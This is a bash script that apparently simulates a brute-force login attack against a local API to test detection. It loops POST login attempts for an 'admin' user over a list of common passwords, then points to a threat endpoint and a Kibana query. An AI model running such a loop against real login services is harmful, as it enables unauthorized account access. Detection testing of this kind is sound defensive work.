#!/bin/bash

# APT Simulation: Brute Force Attack (Initial Access)
# MITRE ATT&CK: T1110 - Brute Force

API_BASE="${API_BASE:-http://localhost:8000}"
ATTACK_COUNT="${ATTACK_COUNT:-50}"
TARGET_USER="${TARGET_USER:-admin}"

echo "🔥 APT Simulation: Brute Force Attack"
echo "===================================="
echo "Target: $API_BASE/api/v1/users/login"
echo "Attempts: $ATTACK_COUNT failed login attempts"
echo "Target User: $TARGET_USER"
echo ""

# Common password patterns used in brute force attacks
PASSWORDS=(
    "password"
    "123456"
    "admin"
    "password123"
    "letmein"
    "welcome"
    "monkey"
    "1234567890"
    "qwerty"
    "abc123"
    "Password1"
    "iloveyou"
    "trustno1"
    "dragon"
    "master"
    "hello"
    "freedom"
    "whatever"
    "football"
    "jesus"
)

echo "🚀 Starting brute force simulation..."
start_time=$(date)

for i in $(seq 1 $ATTACK_COUNT); do
    # Select random password from common list
    password_index=$((RANDOM % ${#PASSWORDS[@]}))
    password="${PASSWORDS[$password_index]}$i"

    echo "  [$i/$ATTACK_COUNT] Trying: $TARGET_USER / $password"

    # Simulate failed login attempt
    response=$(curl -s -w "%{http_code}" -o /dev/null \
        -X POST "$API_BASE/api/v1/users/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$TARGET_USER&password=$password")

    # Add small delay to avoid overwhelming the server
    sleep 0.2

    # Show progress every 10 attempts
    if [ $((i % 10)) -eq 0 ]; then
        echo "    Progress: $i/$ATTACK_COUNT attempts completed..."
    fi
done

end_time=$(date)

echo ""
echo "✅ Brute force simulation completed!"
echo "📊 Attack Summary:"
echo "   Failed Attempts: $ATTACK_COUNT"
echo "   Target User: $TARGET_USER"
echo "   Start Time: $start_time"
echo "   End Time: $end_time"
echo ""
echo "🔍 Check detection results:"
echo "   curl '$API_BASE/api/v1/security/threats/brute-force'"
echo ""
echo "📊 View in Kibana:"
echo "   http://localhost:5601/app/discover#/?_g=(filters:!(),query:(language:kuery,query:'security_event:authentication_failure'))"